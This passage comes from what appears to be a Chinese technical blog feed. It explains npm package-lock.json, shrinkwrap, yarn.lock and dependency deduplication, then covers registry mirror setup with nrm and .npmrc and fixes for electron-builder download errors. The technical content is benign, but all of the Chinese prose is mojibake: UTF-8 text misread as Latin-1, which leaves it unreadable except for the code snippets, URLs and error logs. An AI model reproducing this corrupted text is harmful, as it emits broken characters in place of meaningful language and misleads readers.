ä¸­åˆ—å‡ºçš„æ¯ä¸ªä¾èµ–é¡¹çš„å¤§åž‹åˆ—è¡¨ï¼Œåº”å®‰è£…çš„ç‰¹å®šç‰ˆæœ¬ï¼Œæ¨¡å—çš„ä½ç½®ï¼ˆURIï¼‰ï¼ŒéªŒè¯æ¨¡å—å®Œæ•´æ€§çš„å“ˆå¸Œï¼Œå®ƒéœ€è¦çš„åŒ…åˆ—è¡¨ï¼Œä»¥åŠä¾èµ–é¡¹åˆ—è¡¨ã€‚è¿è¡Œ npm install çš„æ—¶å€™ä¼šä¼˜å…ˆä½¿ç”¨ npm-shrinkwrap.json è¿›è¡Œå®‰è£…ï¼Œæ²¡æœ‰åˆ™ä½¿ç”¨ package.json è¿›è¡Œå®‰è£…ã€‚ package-lockåœ¨ npm5 ç‰ˆæœ¬åŽï¼Œå½“æˆ‘ä»¬è¿è¡Œ npm intall å‘çŽ°ä¼šç”Ÿæˆä¸€ä¸ªæ–°æ–‡ä»¶ package-lock.jsonï¼Œå†…å®¹è·Ÿä¸Šé¢æåˆ°çš„ npm-shrinkwrap.json åŸºæœ¬ä¸€æ ·ã€‚ 1234567891011121314151617181920212223242526272829303132333435"vue-loader": &#123; "version": "14.2.4", "resolved": "https://registry.npmjs.org/vue-loader/-/vue-loader-14.2.4.tgz", "integrity": "sha512-bub2/rcTMJ3etEbbeehdH2Em3G2F5vZIjMK7ZUePj5UtgmZSTtOX1xVVawDpDsy021s3vQpO6VpWJ3z3nO8dDw==", "dev": true, "requires": &#123; "consolidate": "^0.14.0", "hash-sum": "^1.0.2", "loader-utils": "^1.1.0", "lru-cache": "^4.1.1", "postcss": "^6.0.8", "postcss-load-config": "^1.1.0", "postcss-selector-parser": "^2.0.0", "prettier": "^1.16.0", "resolve": "^1.4.0", "source-map": "^0.6.1", "vue-hot-reload-api": "^2.2.0", "vue-style-loader": "^4.0.1", "vue-template-es2015-compiler": "^1.6.0" &#125;, "dependencies": &#123; "postcss-load-config": &#123; "version": "1.2.0", "resolved": "https://registry.npmjs.org/postcss-load-config/-/postcss-load-config-1.2.0.tgz", "integrity": "sha1-U56a/J3chiASHr+djDZz4M5Q0oo=", "dev": true, "requires": &#123; "cosmiconfig": "^2.1.0", "object-assign": "^4.1.0", "postcss-load-options": "^1.2.0", "postcss-load-plugins": "^2.3.0" &#125; &#125;, &#125;&#125;, å½“é¡¹ç›®ä¸­å·²æœ‰ package-lock.json æ–‡ä»¶ï¼Œåœ¨å®‰è£…é¡¹ç›®ä¾èµ–æ—¶ï¼Œå°†ä»¥è¯¥æ–‡ä»¶ä¸ºä¸»è¿›è¡Œè§£æžå®‰è£…æŒ‡å®šç‰ˆæœ¬ä¾èµ–åŒ…ï¼Œè€Œä¸æ˜¯ä½¿ç”¨ package.json æ¥è§£æžå’Œå®‰è£…æ¨¡å—ã€‚å› ä¸º package-lock ä¸ºæ¯ä¸ªæ¨¡å—åŠå…¶æ¯ä¸ªä¾èµ–é¡¹æŒ‡å®šäº†ç‰ˆæœ¬ï¼Œä½ç½®å’Œå®Œæ•´æ€§å“ˆå¸Œï¼Œæ‰€ä»¥å®ƒæ¯æ¬¡åˆ›å»ºçš„å®‰è£…éƒ½æ˜¯ç›¸åŒçš„ã€‚ æ— è®ºä½ ä½¿ç”¨ä»€ä¹ˆè®¾å¤‡ï¼Œæˆ–è€…å°†æ¥å®‰è£…å®ƒéƒ½æ— å…³ç´§è¦ï¼Œæ¯æ¬¡éƒ½åº”è¯¥ç»™ä½ ç›¸åŒçš„ç»“æžœã€‚ npm5 ç‰ˆæœ¬ä¸‹ install è§„åˆ™npm å¹¶ä¸æ˜¯ä¸€å¼€å§‹å°±æ˜¯æŒ‰ç…§çŽ°æœ‰è¿™ç§è§„åˆ™åˆ¶å®šçš„ã€‚ 5.0.x ç‰ˆæœ¬ï¼š ä¸ç®¡ package.json ä¸­ä¾èµ–æ˜¯å¦æœ‰æ›´æ–°ï¼Œnpm install éƒ½ä¼šæ ¹æ® package-lock.json ä¸‹è½½ã€‚é’ˆå¯¹è¿™ç§å®‰è£…ç­–ç•¥ï¼Œæœ‰äººæå‡ºäº†è¿™ä¸ª issue ï¼Œç„¶åŽå°±æ¼”å˜æˆäº† 5.1.0 ç‰ˆæœ¬åŽçš„è§„åˆ™ã€‚ 5.1.0 ç‰ˆæœ¬åŽï¼š å½“ package.json ä¸­çš„ä¾èµ–é¡¹æœ‰æ–°ç‰ˆæœ¬æ—¶ï¼Œnpm install ä¼šæ— è§† package-lock.json åŽ»ä¸‹è½½æ–°ç‰ˆæœ¬çš„ä¾èµ–é¡¹å¹¶ä¸”æ›´æ–° package-lock.jsonã€‚é’ˆå¯¹è¿™ç§å®‰è£…ç­–ç•¥ï¼Œåˆæœ‰äººæå‡ºäº†ä¸€ä¸ª issue å‚è€ƒ npm è´¡çŒ®è€… iarna çš„è¯„è®ºï¼Œå¾—å‡º 5.4.2 ç‰ˆæœ¬åŽçš„è§„åˆ™ã€‚ 5.4.2 ç‰ˆæœ¬åŽï¼š å¦‚æžœåªæœ‰ä¸€ä¸ª package.json æ–‡ä»¶ï¼Œè¿è¡Œ npm install ä¼šæ ¹æ®å®ƒç”Ÿæˆä¸€ä¸ª package-lock.json æ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶ç›¸å½“äºŽæœ¬æ¬¡ install çš„ä¸€ä¸ªå¿«ç…§ï¼Œå®ƒä¸ä»…è®°å½•äº† package.json æŒ‡æ˜Žçš„ç›´æŽ¥ä¾èµ–çš„ç‰ˆæœ¬ï¼Œä¹Ÿè®°å½•äº†é—´æŽ¥ä¾èµ–çš„ç‰ˆæœ¬ã€‚ å¦‚æžœ package.json çš„ semver-range version å’Œ package-lock.json ä¸­ç‰ˆæœ¬å…¼å®¹(package-lock.json ç‰ˆæœ¬åœ¨ package.json æŒ‡å®šçš„ç‰ˆæœ¬èŒƒå›´å†…)ï¼Œå³ä½¿æ­¤æ—¶ package.json ä¸­æœ‰æ–°çš„ç‰ˆæœ¬ï¼Œæ‰§è¡Œ npm install ä¹Ÿè¿˜æ˜¯ä¼šæ ¹æ® package-lock.json ä¸‹è½½ã€‚ å¦‚æžœæ‰‹åŠ¨ä¿®æ”¹äº† package.json çš„ version rangesï¼Œä¸”å’Œ package-lock.json ä¸­ç‰ˆæœ¬ä¸å…¼å®¹ï¼Œé‚£ä¹ˆæ‰§è¡Œ npm install æ—¶ package-lock.json å°†ä¼šæ›´æ–°åˆ°å…¼å®¹ package.json çš„ç‰ˆæœ¬ã€‚ yarnyarn çš„å‡ºçŽ°ä¸»è¦ç›®æ ‡æ˜¯è§£å†³ä¸Šé¢æè¿°çš„ç”±äºŽè¯­ä¹‰ç‰ˆæœ¬æŽ§åˆ¶è€Œå¯¼è‡´çš„ npm å®‰è£…çš„ä¸ç¡®å®šæ€§é—®é¢˜ã€‚è™½ç„¶å¯ä»¥ä½¿ç”¨ npm shrinkwrap æ¥å®žçŽ°å¯é¢„æµ‹çš„ä¾èµ–å…³ç³»æ ‘ï¼Œä½†å®ƒå¹¶ä¸æ˜¯é»˜è®¤é€‰é¡¹ï¼Œè€Œæ˜¯å–å†³äºŽæ‰€æœ‰çš„å¼€å‘äººå‘˜çŸ¥é“å¹¶ä¸”å¯ç”¨è¿™ä¸ªé€‰é¡¹ã€‚yarn é‡‡å–äº†ä¸åŒçš„åšæ³•ã€‚æ¯ä¸ª yarn å®‰è£…éƒ½ä¼šç”Ÿæˆä¸€ä¸ªç±»ä¼¼äºŽnpm-shrinkwrap.json çš„ yarn.lock æ–‡ä»¶ï¼Œè€Œä¸”å®ƒæ˜¯é»˜è®¤åˆ›å»ºçš„ã€‚é™¤äº†å¸¸è§„ä¿¡æ¯ä¹‹å¤–ï¼Œyarn.lock æ–‡ä»¶è¿˜åŒ…å«è¦å®‰è£…çš„å†…å®¹çš„æ ¡éªŒå’Œï¼Œä»¥ç¡®ä¿ä½¿ç”¨çš„åº“çš„ç‰ˆæœ¬ç›¸åŒã€‚ yarn çš„ä¸»è¦ä¼˜åŒ–yarn çš„å‡ºçŽ°ä¸»è¦åšäº†å¦‚ä¸‹ä¼˜åŒ–ï¼š å¹¶è¡Œå®‰è£…ï¼šæ— è®º npm è¿˜æ˜¯ yarn åœ¨æ‰§è¡ŒåŒ…çš„å®‰è£…æ—¶ï¼Œéƒ½ä¼šæ‰§è¡Œä¸€ç³»åˆ—ä»»åŠ¡ã€‚npm æ˜¯æŒ‰ç…§é˜Ÿåˆ—æ‰§è¡Œæ¯ä¸ª packageï¼Œä¹Ÿå°±æ˜¯è¯´å¿…é¡»è¦ç­‰åˆ°å½“å‰ package å®‰è£…å®Œæˆä¹‹åŽï¼Œæ‰èƒ½ç»§ç»­åŽé¢çš„å®‰è£…ã€‚è€Œ yarn æ˜¯åŒæ­¥æ‰§è¡Œæ‰€æœ‰ä»»åŠ¡ï¼Œæé«˜äº†æ€§èƒ½ã€‚ ç¦»çº¿æ¨¡å¼ï¼šå¦‚æžœä¹‹å‰å·²ç»å®‰è£…è¿‡ä¸€ä¸ªè½¯ä»¶åŒ…ï¼Œç”¨ yarn å†æ¬¡å®‰è£…æ—¶ä¹‹é—´ä»Žç¼“å­˜ä¸­èŽ·å–ï¼Œå°±ä¸ç”¨åƒ npm é‚£æ ·å†ä»Žç½‘ç»œä¸‹è½½äº†ã€‚ å®‰è£…ç‰ˆæœ¬ç»Ÿä¸€ï¼šä¸ºäº†é˜²æ­¢æ‹‰å–åˆ°ä¸åŒçš„ç‰ˆæœ¬ï¼Œyarn æœ‰ä¸€ä¸ªé”å®šæ–‡ä»¶ (lock file) è®°å½•äº†è¢«ç¡®åˆ‡å®‰è£…ä¸Šçš„æ¨¡å—çš„ç‰ˆæœ¬å·ã€‚æ¯æ¬¡åªè¦æ–°å¢žäº†ä¸€ä¸ªæ¨¡å—ï¼Œyarn å°±ä¼šåˆ›å»ºï¼ˆæˆ–æ›´æ–°ï¼‰yarn.lock è¿™ä¸ªæ–‡ä»¶ã€‚è¿™ä¹ˆåšå°±ä¿è¯äº†ï¼Œæ¯ä¸€æ¬¡æ‹‰å–åŒä¸€ä¸ªé¡¹ç›®ä¾èµ–æ—¶ï¼Œä½¿ç”¨çš„éƒ½æ˜¯ä¸€æ ·çš„æ¨¡å—ç‰ˆæœ¬ã€‚ æ›´å¥½çš„è¯­ä¹‰åŒ–ï¼š yarn æ”¹å˜äº†ä¸€äº› npm å‘½ä»¤çš„åç§°ï¼Œæ¯”å¦‚ yarn add/removeï¼Œæ¯” npm åŽŸæœ¬çš„ install/uninstall è¦æ›´æ¸…æ™°ã€‚ å®‰è£…ä¾èµ–æ ‘æµç¨‹ æ‰§è¡Œå·¥ç¨‹è‡ªèº« preinstallã€‚å½“å‰ npm å·¥ç¨‹å¦‚æžœå®šä¹‰äº† preinstall é’©å­æ­¤æ—¶ä¼šè¢«æ‰§è¡Œã€‚ ç¡®å®šé¦–å±‚ä¾èµ–ã€‚æ¨¡å—é¦–å…ˆéœ€è¦åšçš„æ˜¯ç¡®å®šå·¥ç¨‹ä¸­çš„é¦–å±‚ä¾èµ–ï¼Œä¹Ÿå°±æ˜¯ dependencies å’Œ devDependencies å±žæ€§ä¸­ç›´æŽ¥æŒ‡å®šçš„æ¨¡å—ï¼ˆå‡è®¾æ­¤æ—¶æ²¡æœ‰æ·»åŠ  npm install å‚æ•°ï¼‰ã€‚å·¥ç¨‹æœ¬èº«æ˜¯æ•´æ£µä¾èµ–æ ‘çš„æ ¹èŠ‚ç‚¹ï¼Œæ¯ä¸ªé¦–å±‚ä¾èµ–æ¨¡å—éƒ½æ˜¯æ ¹èŠ‚ç‚¹ä¸‹é¢çš„ä¸€æ£µå­æ ‘ï¼Œnpm ä¼šå¼€å¯å¤šè¿›ç¨‹ä»Žæ¯ä¸ªé¦–å±‚ä¾èµ–æ¨¡å—å¼€å§‹é€æ­¥å¯»æ‰¾æ›´æ·±å±‚çº§çš„èŠ‚ç‚¹ã€‚ èŽ·å–æ¨¡å—ã€‚èŽ·å–æ¨¡å—æ˜¯ä¸€ä¸ªé€’å½’çš„è¿‡ç¨‹ï¼Œåˆ†ä¸ºä»¥ä¸‹å‡ æ­¥ï¼š èŽ·å–æ¨¡å—ä¿¡æ¯ã€‚åœ¨ä¸‹è½½ä¸€ä¸ªæ¨¡å—ä¹‹å‰ï¼Œé¦–å…ˆè¦ç¡®å®šå…¶ç‰ˆæœ¬ï¼Œè¿™æ˜¯å› ä¸º package.json ä¸­å¾€å¾€æ˜¯ semantic versionï¼ˆsemverï¼Œè¯­ä¹‰åŒ–ç‰ˆæœ¬ï¼‰ã€‚æ­¤æ—¶å¦‚æžœç‰ˆæœ¬æè¿°æ–‡ä»¶ï¼ˆnpm-shrinkwrap.json æˆ– package-lock.jsonï¼‰ä¸­æœ‰è¯¥æ¨¡å—ä¿¡æ¯ç›´æŽ¥æ‹¿å³å¯ï¼Œå¦‚æžœæ²¡æœ‰åˆ™ä»Žä»“åº“èŽ·å–ã€‚å¦‚ package.json ä¸­æŸä¸ªåŒ…çš„ç‰ˆæœ¬æ˜¯ ^1.1.0ï¼Œnpm å°±ä¼šåŽ»ä»“åº“ä¸­èŽ·å–ç¬¦åˆ 1.x.x å½¢å¼çš„æœ€æ–°ç‰ˆæœ¬ã€‚ èŽ·å–æ¨¡å—å®žä½“ã€‚ä¸Šä¸€æ­¥ä¼šèŽ·å–åˆ°æ¨¡å—çš„åŽ‹ç¼©åŒ…åœ°å€ï¼ˆresolved å­—æ®µï¼‰ï¼Œnpm ä¼šç”¨æ­¤åœ°å€æ£€æŸ¥æœ¬åœ°ç¼“å­˜ï¼Œç¼“å­˜ä¸­æœ‰å°±ç›´æŽ¥æ‹¿ï¼Œå¦‚æžœæ²¡æœ‰åˆ™ä»Žä»“åº“ä¸‹è½½ã€‚ æŸ¥æ‰¾è¯¥æ¨¡å—ä¾èµ–ï¼Œå¦‚æžœæœ‰ä¾èµ–åˆ™å›žåˆ°ç¬¬ 1 æ­¥ï¼Œå¦‚æžœæ²¡æœ‰åˆ™åœæ­¢ã€‚ æ¨¡å—æ‰å¹³åŒ–ï¼ˆdedupeï¼‰ã€‚ä¸Šä¸€æ­¥èŽ·å–åˆ°çš„æ˜¯ä¸€æ£µå®Œæ•´çš„ä¾èµ–æ ‘ï¼Œå…¶ä¸­å¯èƒ½åŒ…å«å¤§é‡é‡å¤æ¨¡å—ã€‚æ¯”å¦‚ A æ¨¡å—ä¾èµ–äºŽ loadshï¼ŒB æ¨¡å—åŒæ ·ä¾èµ–äºŽ lodashã€‚åœ¨ npm3 ä»¥å‰ä¼šä¸¥æ ¼æŒ‰ç…§ä¾èµ–æ ‘çš„ç»“æž„è¿›è¡Œå®‰è£…ï¼Œå› æ­¤ä¼šé€ æˆæ¨¡å—å†—ä½™ã€‚yarn å’Œä»Ž npm5 å¼€å§‹é»˜è®¤åŠ å…¥äº†ä¸€ä¸ª dedupe çš„è¿‡ç¨‹ã€‚å®ƒä¼šéåŽ†æ‰€æœ‰èŠ‚ç‚¹ï¼Œé€ä¸ªå°†æ¨¡å—æ”¾åœ¨æ ¹èŠ‚ç‚¹ä¸‹é¢ï¼Œä¹Ÿå°±æ˜¯ node-modules çš„ç¬¬ä¸€å±‚ã€‚å½“å‘çŽ°æœ‰é‡å¤æ¨¡å—æ—¶ï¼Œåˆ™å°†å…¶ä¸¢å¼ƒã€‚è¿™é‡Œéœ€è¦å¯¹é‡å¤æ¨¡å—è¿›è¡Œä¸€ä¸ªå®šä¹‰ï¼Œå®ƒæŒ‡çš„æ˜¯æ¨¡å—åç›¸åŒä¸” semver å…¼å®¹ã€‚æ¯ä¸ª semver éƒ½å¯¹åº”ä¸€æ®µç‰ˆæœ¬å…è®¸èŒƒå›´ï¼Œå¦‚æžœä¸¤ä¸ªæ¨¡å—çš„ç‰ˆæœ¬å…è®¸èŒƒå›´å­˜åœ¨äº¤é›†ï¼Œé‚£ä¹ˆå°±å¯ä»¥å¾—åˆ°ä¸€ä¸ªå…¼å®¹ç‰ˆæœ¬ï¼Œè€Œä¸å¿…ç‰ˆæœ¬å·å®Œå…¨ä¸€è‡´ï¼Œè¿™å¯ä»¥ä½¿æ›´å¤šå†—ä½™æ¨¡å—åœ¨ dedupe è¿‡ç¨‹ä¸­è¢«åŽ»æŽ‰ã€‚ å®‰è£…æ¨¡å—ã€‚è¿™ä¸€æ­¥å°†ä¼šæ›´æ–°å·¥ç¨‹ä¸­çš„ node_modulesï¼Œå¹¶æ‰§è¡Œæ¨¡å—ä¸­çš„ç”Ÿå‘½å‘¨æœŸå‡½æ•°ï¼ˆæŒ‰ç…§ preinstallã€installã€postinstall çš„é¡ºåºï¼‰ã€‚ æ‰§è¡Œå·¥ç¨‹è‡ªèº«ç”Ÿå‘½å‘¨æœŸã€‚å½“å‰ npm å·¥ç¨‹å¦‚æžœå®šä¹‰äº†é’©å­æ­¤æ—¶ä¼šè¢«æ‰§è¡Œï¼ˆæŒ‰ç…§ installã€postinstallã€prepublishã€prepare çš„é¡ºåºï¼‰ã€‚ ä¸¾ä¾‹è¯´æ˜Žæ’ä»¶ htmlparser2@^3.10.1 å’Œ dom-serializer@^0.2.2 éƒ½æœ‰ä½¿ç”¨äº† entities ä¾èµ–åŒ…ï¼Œä¸è¿‡ä½¿ç”¨çš„ç‰ˆæœ¬ä¸åŒï¼ŒåŒæ—¶æˆ‘ä»¬è‡ªå·±å®‰è£…ä¸€ä¸ªç‰ˆæœ¬çš„ entities åŒ…ã€‚å…·ä½“å¦‚ä¸‹ï¼š 1234567--htmlparser2@^3.10.1 |--entities@^1.1.1--dom-serializer@^0.2.2 |--entities@^2.0.0--entities@^2.1.0 é€šè¿‡ npm install å®‰è£…åŽï¼Œç”Ÿæˆçš„ package-lock.json æ–‡ä»¶å†…å®¹å’Œå®ƒçš„ node_modules ç›®å½•ç»“æž„ï¼š å¯ä»¥å‘çŽ°ï¼š dom-serializer@^0.2.2 çš„ä¾èµ–åŒ… entities@^2.0.0 å’Œæˆ‘ä»¬è‡ªå·±å®‰è£…çš„ entities@^2.1.0 è¢«å®žé™…å®‰è£…æˆ entities@^2.2.0ï¼Œå¹¶æ”¾åœ¨ node_modules çš„ç¬¬ä¸€å±‚ã€‚å› ä¸ºè¿™ä¸¤ä¸ªç‰ˆæœ¬çš„semver èŒƒå›´ç›¸åŒï¼Œåˆå…ˆè¢«éåŽ†ï¼Œæ‰€æœ‰ä¼šè¢«åˆå¹¶å®‰è£…åœ¨ç¬¬ä¸€å±‚ï¼› htmlparser2@^3.10.1 çš„ä¾èµ–åŒ… entities@^1.1.1 è¢«å®žé™…å®‰æ”¾åœ¨ dom-serializer åŒ…çš„ node_modules ä¸­ï¼Œå¹¶ä¸”å’Œ package-lock.json æè¿°ç»“æž„ä¿æŒä¸€è‡´ã€‚ é€šè¿‡ yarn å®‰è£…åŽï¼Œç”Ÿæˆçš„ yarn.lock æ–‡ä»¶å†…å®¹å’Œå®ƒçš„ node_modules ç›®å½•ç»“æž„ï¼š å¯ä»¥å‘çŽ°ä¸Ž npm install ä¸åŒçš„æ˜¯ï¼š yarn.lock ä¸­æ‰€æœ‰ä¾èµ–æè¿°éƒ½æ˜¯æ‰å¹³åŒ–çš„ï¼Œå³æ²¡æœ‰ä¾èµ–æè¿°çš„åµŒå¥—å…³ç³»ï¼› åœ¨ yarn.lock ä¸­ï¼Œ ç›¸åŒåç§°ç‰ˆæœ¬å·ä¸åŒçš„ä¾èµ–åŒ…ï¼Œå¦‚æžœ semver èŒƒå›´ç›¸åŒä¼šè¢«åˆå¹¶ï¼Œå¦åˆ™ï¼Œä¼šå­˜åœ¨å¤šä¸ªç‰ˆæœ¬æè¿°ã€‚ æ³¨æ„ cnpm ä¸æ”¯æŒ package-lockä½¿ç”¨ cnpm install æ—¶å€™ï¼Œå¹¶ä¸ä¼šç”Ÿæˆ package-lock.json æ–‡ä»¶ã€‚cnpm install çš„æ—¶å€™ï¼Œå°±ç®—ä½ é¡¹ç›®ä¸­æœ‰ package-lock.json æ–‡ä»¶ï¼Œcnpm ä¹Ÿä¸ä¼šè¯†åˆ«ï¼Œä»ä¼šæ ¹æ® package.json æ¥å®‰è£…ã€‚æ‰€ä»¥è¿™å°±æ˜¯ä¸ºä»€ä¹ˆä¹‹å‰ä½ ç”¨ npm å®‰è£…äº§ç”Ÿäº† package-lock.jsonï¼ŒåŽé¢çš„äººç”¨ cnpm æ¥å®‰è£…ï¼Œå¯èƒ½ä¼šè·Ÿä½ å®‰è£…çš„ä¾èµ–åŒ…ä¸ä¸€è‡´ã€‚ å› æ­¤ï¼Œå°½é‡ä¸è¦ç›´æŽ¥ä½¿ç”¨ cnpm install å®‰è£…é¡¹ç›®ä¾èµ–åŒ…ã€‚ä½†æ˜¯ä¸ºäº†è§£å†³ç›´æŽ¥ä½¿ç”¨ npm install é€Ÿåº¦æ…¢çš„é—®é¢˜ï¼Œå¯ä»¥è®¾ç½® npm ä»£ç†è§£å†³ã€‚ 12345// è®¾ç½®æ·˜å®é•œåƒä»£ç†npm config set registry https://registry.npm.taobao.org// æŸ¥çœ‹å·²è®¾ç½®ä»£ç†npm config get registry å½“ç„¶ï¼Œä¹Ÿå¯ä»¥é€šè¿‡ nrm å·¥å…·ï¼Œå¿«æ·æ“ä½œè®¾ç½®ä»£ç†ã€‚ å…¨å±€å®‰è£… 1$ npm install -g nrm æŸ¥çœ‹å·²å®‰è£…ä»£ç†åˆ—è¡¨ 12345678$ nrm ls* npm ----- https://registry.npmjs.org/ yarn ----- https://registry.yarnpkg.com cnpm ---- http://r.cnpmjs.org/ taobao -- https://registry.npm.taobao.org/ nj ------ https://registry.nodejitsu.com/ skimdb -- https://skimdb.npmjs.com/registry åˆ‡æ¢ä»£ç† 123$ nrm use cnpm //switch registry to cnpm* Registry has been set to: http://r.cnpmjs.org/ æµ‹é€Ÿ 123$ nrm test cnpm* cnpm --- 618ms ç„¶è€Œï¼Œè®¾ç½®è¿™äº›å…¨å±€ä»£ç†å¯èƒ½è¿˜æ˜¯ä¸èƒ½æ»¡è¶³ä¸‹è½½ä¸€äº›ç‰¹å®šä¾èµ–åŒ…ï¼ˆåœ¨æ²¡æœ‰ VPN æƒ…å†µä¸‹ï¼‰ï¼Œæ¯”å¦‚ï¼šnode-sassã€puppeteerã€chromedriverã€electron ç­‰ã€‚å¯ä»¥é€šè¿‡ .npmrc æ–‡ä»¶è®¾ç½®å…·ä½“ä¾èµ–åŒ…çš„å›½å†…é•œåƒã€‚è¯¥æ–‡ä»¶åœ¨é¡¹ç›® npm install æ—¶ä¼šè¢«åŠ è½½è¯»å–ï¼Œä¼˜å…ˆçº§é«˜äºŽ npm å…¨å±€è®¾ç½®ã€‚ 12345registry=https://registry.npm.taobao.org/sass_binary_site=http://npm.taobao.org/mirrors/node-sasschromedriver_cdnurl=http://npm.taobao.org/mirrors/chromedriverelectron_mirror=http://npm.taobao.org/mirrors/electron/ npm install -g electronpuppeteer_download_host=http://npm.taobao.org/mirrors/chromium-browser-snapshots/ æ€»ç»“é¡¹ç›®åœ¨ä»¥åŽé‡æ–°æž„å»ºï¼Œç”±äºŽä¾èµ–æ ‘ä¸­æœ‰ç‰ˆæœ¬æ›´æ–°ï¼Œé€ æˆæ„å¤–äº‹æ•…æ˜¯ä¸å¯é¿å…çš„ï¼Œç©¶å…¶åŽŸå› æ˜¯æ•´ä¸ªä¾èµ–æ ‘ç‰ˆæœ¬æ²¡æœ‰é”ã€‚è§£å†³æ–¹æ¡ˆåˆ†ä¸ºå¦‚ä¸‹å››ç§ï¼š package.json ä¸­å›ºå®šç‰ˆæœ¬ã€‚æ³¨æ„ï¼šä»…èƒ½é”å®šå½“å‰ä¾èµ–åŒ…ç‰ˆæœ¬ï¼Œä¸èƒ½æŽ§åˆ¶æ•´æ£µä¾èµ–æ ‘ç‰ˆæœ¬ã€‚ npm+npm-shrinkwrap.jsonã€‚ npm+package-lock.jsonã€‚ yarn+yarn-lock.jsonã€‚ æ ¹æ®è‡ªèº«æƒ…å†µé€‰æ‹©ã€‚è§è¯†æœ‰é™ï¼Œæ¬¢è¿ŽæŒ‡æ­£ï¼Œè°¢è°¢ç‚¹èµžï¼Œå®Œï½ž]]></content>
      <tags>
        <tag>javascript</tag>
        <tag>npm</tag>
        <tag>webpack</tag>
        <tag>yarn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[electron]]></title>
    <url>%2F2020%2F12%2F25%2Felectron%2F</url>
    <content type="text"><![CDATA[electron-builder æ‰“åŒ…æŠ¥é”™åœ¨æ²¡æœ‰ç¿»å¢™çŽ¯å¢ƒä¸‹ï¼Œæœ‰äº›å®‰è£…åŒ…æ— æ³•é€šè¿‡ npm ç›´æŽ¥ä¸‹è½½ï¼Œè¿™æ ·ä¼šé€ æˆæ‰“åŒ…ä¸­æ–­ï¼Œæ— æ³•æˆåŠŸã€‚ä¸€èˆ¬çš„ï¼Œä¼šæœ‰å¦‚ä¸‹æƒ…å†µã€‚ èŽ·å–ä¸åˆ° electron-vxxx-xx-xx.zipé¦–æ¬¡é€šè¿‡ electron-builder æ‰“åŒ…ï¼Œä¼šæŠ¥ä»¥ä¸‹é”™è¯¯ï¼Œç”±äºŽç½‘ç»œåŽŸå› èŽ·å–ä¸åˆ° electron å®‰è£…åŒ…ã€‚ 123â€¢ packaging platform=win32 arch=x64 electron=11.1.1 appOutDir=dist\win-unpacked â¨¯ Get "https://github-production-release-asset-2e65be.s3.amazonaws.com/9384267/4bb69b00-4382-11eb-89a3-0478a8f71cb3?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20201225%2Fus-east-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20201225T033206Z&amp;X-Amz-Expires=300&amp;X-Amz-Signature=39ef3cf5665a8fd42f61b5e74aac8ab28d9be97aacb190ddbe10c56918b6caaf&amp;X-Amz-SignedHeaders=host&amp;actor_id=0&amp;key_id=0&amp;repo_id=9384267&amp;response-content-disposition=attachment%3B%20filename%3Delectron-v11.1.1-win32-x64.zip&amp;response-content-type=application%2Foctet-stream": read tcp 100.119.114.140:50153-&gt;52.217.64.100:443: wsarecv: Anexisting connection was forcibly closed by the remote host. è§£å†³æ–¹æ¡ˆæ·˜å®electroné•œåƒï¼Œé€‰æ‹©æŠ¥é”™æç¤ºéœ€è¦å®‰è£…çš„ç‰ˆæœ¬ä¸‹è½½å³å¯ã€‚ ä¸‹è½½å®ŒæˆåŽï¼Œå°†è¯¥å®‰è£…åŒ…ï¼ˆzipï¼‰æ”¾åˆ°ä¸€ä¸‹ç›®å½•ä¸‹ï¼š 123macOS: ~/Library/Caches/electronLinux: ~/.cache/electronwindows: %LOCALAPPDATA%\electron\cache èŽ·å–ä¸åˆ° winCodeSign-x.x.x.7zç»§ç»­æ‰“åŒ…ä¼šæŠ¥ä»¥ä¸‹é”™è¯¯ï¼Œç”±äºŽç½‘ç»œåŽŸå› èŽ·å–ä¸åˆ° winCodeSign å®‰è£…åŒ…ã€‚ 1â¨¯ Get "https://github-production-release-asset-2e65be.s3.amazonaws.com/65527128/f73f2200-5d53-11ea-8264-ddd345f11ee4?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20201226%2Fus-east-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20201226T064126Z&amp;X-Amz-Expires=300&amp;X-Amz-Signature=5dae4023a11f1b575dd5df18ec8f4e2d5664f3214d41365665d6393f29d5716a&amp;X-Amz-SignedHeaders=host&amp;actor_id=0&amp;key_id=0&amp;repo_id=65527128&amp;response-content-disposition=attachment%3B%20filename%3DwinCodeSign-2.6.0.7z&amp;response-content-type=application%2Foctet-stream": read tcp 100.119.114.140:58909-&gt;52.217.18.220:443: wsarecv: An existing connection was forcibly closed by the remote host. è§£å†³æ–¹æ¡ˆgithub ä¸Šæ‰¾åˆ° electron æ‰“åŒ…äºŒè¿›åˆ¶æ–‡ä»¶ releasesï¼Œé€‰æ‹©æŠ¥é”™éœ€è¦çš„ç‰ˆæœ¬çš„ winCodeSign å®‰è£…åŒ…ä¸‹è½½ï¼Œä¸‹è½½è§£åŽ‹åŽï¼Œæ•´ä¸ªæ–‡ä»¶å¤¹ï¼ˆå¸¦ç‰ˆæœ¬å·ç›¸å…³ä¿¡æ¯ï¼‰æ”¾åˆ°ä»¥ä¸‹ç›®å½•ä¸‹ 123macOS ~/Library/Caches/electron-builder/winCodeSignlinux ~/.cache/electron-builder/winCodeSignwindows %LOCALAPPDATA%\electron-builder\cache\winCodeSign èŽ·å–ä¸åˆ° nsis-x.x.x.7zç»§ç»­æ‰“åŒ…ä¼šæŠ¥ä»¥ä¸‹é”™è¯¯ï¼Œç”±äºŽç½‘ç»œåŽŸå› èŽ·å–ä¸åˆ° nsis å®‰è£…åŒ…ã€‚ 1â¨¯ Get "https://github-production-release-asset-2e65be.s3.amazonaws.com/65527128/10518a80-10f6-11ea-8d2f-403bab81b4cd?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20201226%2Fus-east-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20201226T080004Z&amp;X-Amz-Expires=300&amp;X-Amz-Signature=041ed954e78b77440ddb400f0ce9bca3e20cb45dc18c42f8e40029ae11f9c564&amp;X-Amz-SignedHeaders=host&amp;actor_id=0&amp;key_id=0&amp;repo_id=65527128&amp;response-content-disposition=attachment%3B%20filename%3Dnsis-3.0.4.1.7z&amp;response-content-type=application%2Foctet-stream": read tcp 100.119.114.140:56915-&gt;52.217.17.36:443: wsarecv: An existing 